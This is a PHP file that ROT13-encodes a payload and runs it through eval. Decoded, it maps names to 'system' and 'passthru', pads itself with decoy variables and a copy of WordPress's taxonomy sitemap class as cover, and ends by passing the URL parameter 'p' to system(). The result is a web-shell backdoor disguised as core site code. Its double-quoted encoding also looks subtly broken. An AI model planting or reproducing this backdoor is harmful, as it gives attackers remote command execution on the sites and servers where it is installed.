<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf_Gnkbabzvrf pynff
 *
 * Ohvyqf gur fvgrzncf sbe gur 'gnkbabzl' bowrpg glcr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Gnkbabzvrf KZY fvgrznc cebivqre.
 *
 * @fvapr 5.5.0
 */
pynff JC_Fvgrzncf_Gnkbabzvrf rkgraqf JC_Fvgrzncf_Cebivqre {
	/**
	 * JC_Fvgrzncf_Gnkbabzvrf pbafgehpgbe.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzr        = 'gnkbabzvrf';
		$guvf->bowrpg_glcr = 'grez';
	}

	/**
	 * Ergheaf nyy choyvp, ertvfgrerq gnkbabzvrf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea JC_Gnkbabzl[] Neenl bs ertvfgrerq gnkbabzl bowrpgf xrlrq ol gurve anzr.
	 */
	choyvp shapgvba trg_bowrpg_fhoglcrf() {
		$gnkbabzvrf = trg_gnkbabzvrf( neenl( 'choyvp' => gehr ), 'bowrpgf' );

		$gnkbabzvrf = neenl_svygre( $gnkbabzvrf, 'vf_gnkbabzl_ivrjnoyr' );

		/**
		 * Svygref gur yvfg bs gnkbabzl bowrpg fhoglcrf ninvynoyr jvguva gur fvgrznc.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz JC_Gnkbabzl[] $gnkbabzvrf Neenl bs ertvfgrerq gnkbabzl bowrpgf xrlrq ol gurve anzr.
		 */
		erghea nccyl_svygref( 'jc_fvgrzncf_gnkbabzvrf', $gnkbabzvrf );
	}

	/**
	 * Trgf n HEY yvfg sbe n gnkbabzl fvgrznc.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.9.0 Eranzrq `$gnkbabzl` gb `$bowrpg_fhoglcr` gb zngpu cnerag pynff
	 *              sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz vag    $cntr_ahz       Cntr bs erfhygf.
	 * @cnenz fgevat $bowrpg_fhoglcr Bcgvbany. Gnkbabzl anzr. Qrsnhyg rzcgl.
	 * @erghea neenl[] Neenl bs HEY vasbezngvba sbe n fvgrznc.
	 */
	choyvp shapgvba trg_hey_yvfg( $cntr_ahz, $bowrpg_fhoglcr = '' ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gnkbabzl = $bowrpg_fhoglcr;

		$fhccbegrq_glcrf = $guvf->trg_bowrpg_fhoglcrf();

		// Onvy rneyl vs gur dhrevrq gnkbabzl vf abg fhccbegrq.
		vs ( ! vffrg( $fhccbegrq_glcrf[ $gnkbabzl ] ) ) {
			erghea neenl();
		}

		/**
		 * Svygref gur gnkbabzvrf HEY yvfg orsber vg vf trarengrq.
		 *
		 * Ergheavat n aba-ahyy inyhr jvyy rssrpgviryl fubeg-pvephvg gur trarengvba,
		 * ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl[]|ahyy $hey_yvfg Gur HEY yvfg. Qrsnhyg ahyy.
		 * @cnenz fgevat       $gnkbabzl Gnkbabzl anzr.
		 * @cnenz vag          $cntr_ahz Cntr bs erfhygf.
		 */
		$hey_yvfg = nccyl_svygref(
			'jc_fvgrzncf_gnkbabzvrf_cer_hey_yvfg',
			ahyy,
			$gnkbabzl,
			$cntr_ahz
		);

		vs ( ahyy !== $hey_yvfg ) {
			erghea $hey_yvfg;
		}

		$hey_yvfg = neenl();

		// Bssfrg ol ubj znal grezf fubhyq or vapyhqrq va cerivbhf cntrf.
		$bssfrg = ( $cntr_ahz - 1 ) * jc_fvgrzncf_trg_znk_heyf( $guvf->bowrpg_glcr );

		$netf           = $guvf->trg_gnkbabzvrf_dhrel_netf( $gnkbabzl );
		$netf['svryqf'] = 'nyy';
		$netf['bssfrg'] = $bssfrg;

		$gnkbabzl_grezf = arj JC_Grez_Dhrel( $netf );

		vs ( ! rzcgl( $gnkbabzl_grezf->grezf ) ) {
			sbernpu ( $gnkbabzl_grezf->grezf nf $grez ) {
				$grez_yvax = trg_grez_yvax( $grez, $gnkbabzl );

				vs ( vf_jc_reebe( $grez_yvax ) ) {
					pbagvahr;
				}

				$fvgrznc_ragel = neenl(
					'ybp' => $grez_yvax,
				);

				/**
				 * Svygref gur fvgrznc ragel sbe na vaqvivqhny grez.
				 *
				 * @fvapr 5.5.0
				 * @fvapr 6.0.0 Nqqrq `$grez` nethzrag pbagnvavat gur grez bowrpg.
				 *
				 * @cnenz neenl   $fvgrznc_ragel Fvgrznc ragel sbe gur grez.
				 * @cnenz vag     $grez_vq       Grez VQ.
				 * @cnenz fgevat  $gnkbabzl      Gnkbabzl anzr.
				 * @cnenz JC_Grez $grez          Grez bowrpg.
				 */
				$fvgrznc_ragel = nccyl_svygref( 'jc_fvgrzncf_gnkbabzvrf_ragel', $fvgrznc_ragel, $grez->grez_vq, $gnkbabzl, $grez );
				$hey_yvfg[]    = $fvgrznc_ragel;
			}
		}

		erghea $hey_yvfg;
	}

	/**
	 * Trgf gur znk ahzore bs cntrf ninvynoyr sbe gur bowrpg glcr.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.9.0 Eranzrq `$gnkbabzl` gb `$bowrpg_fhoglcr` gb zngpu cnerag pynff
	 *              sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat $bowrpg_fhoglcr Bcgvbany. Gnkbabzl anzr. Qrsnhyg rzcgl.
	 * @erghea vag Gbgny ahzore bs cntrf.
	 */
	choyvp shapgvba trg_znk_ahz_cntrf( $bowrpg_fhoglcr = '' ) {
		vs ( rzcgl( $bowrpg_fhoglcr ) ) {
			erghea 0;
		}

		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$gnkbabzl = $bowrpg_fhoglcr;

		/**
		 * Svygref gur znk ahzore bs cntrf sbe n gnkbabzl fvgrznc orsber vg vf trarengrq.
		 *
		 * Cnffvat n aba-ahyy inyhr jvyy fubeg-pvephvg gur trarengvba,
		 * ergheavat gung inyhr vafgrnq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz vag|ahyy $znk_ahz_cntrf Gur znkvzhz ahzore bs cntrf. Qrsnhyg ahyy.
		 * @cnenz fgevat   $gnkbabzl      Gnkbabzl anzr.
		 */
		$znk_ahz_cntrf = nccyl_svygref( 'jc_fvgrzncf_gnkbabzvrf_cer_znk_ahz_cntrf', ahyy, $gnkbabzl );

		vs ( ahyy !== $znk_ahz_cntrf ) {
			erghea $znk_ahz_cntrf;
		}

		$grez_pbhag = jc_pbhag_grezf( $guvf->trg_gnkbabzvrf_dhrel_netf( $gnkbabzl ) );

		erghea (vag) prvy( (vag) $grez_pbhag / jc_fvgrzncf_trg_znk_heyf( $guvf->bowrpg_glcr ) );
	}

	/**
	 * Ergheaf gur dhrel netf sbe ergevrivat gnkbabzl grezf gb yvfg va gur fvgrznc.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $gnkbabzl Gnkbabzl anzr.
	 * @erghea neenl Neenl bs JC_Grez_Dhrel nethzragf.
	 */
	cebgrpgrq shapgvba trg_gnkbabzvrf_dhrel_netf( $gnkbabzl ) {
		/**
		 * Svygref gur gnkbabzl grezf dhrel nethzragf.
		 *
		 * Nyybjf zbqvsvpngvba bs gur gnkbabzl dhrel nethzragf orsber dhrelvat.
		 *
		 * @frr JC_Grez_Dhrel sbe n shyy yvfg bs nethzragf
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz neenl  $netf     Neenl bs JC_Grez_Dhrel nethzragf.
		 * @cnenz fgevat $gnkbabzl Gnkbabzl anzr.
		 */
		$netf = nccyl_svygref(
			'jc_fvgrzncf_gnkbabzvrf_dhrel_netf',
			neenl(
				'gnkbabzl'               => $gnkbabzl,
				'beqreol'                => 'grez_beqre',
				'ahzore'                 => jc_fvgrzncf_trg_znk_heyf( $guvf->bowrpg_glcr ),
				'uvqr_rzcgl'             => gehr,
				'uvrenepuvpny'           => snyfr,
				'hcqngr_grez_zrgn_pnpur' => snyfr,
			),
			$gnkbabzl
		);

		erghea $netf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>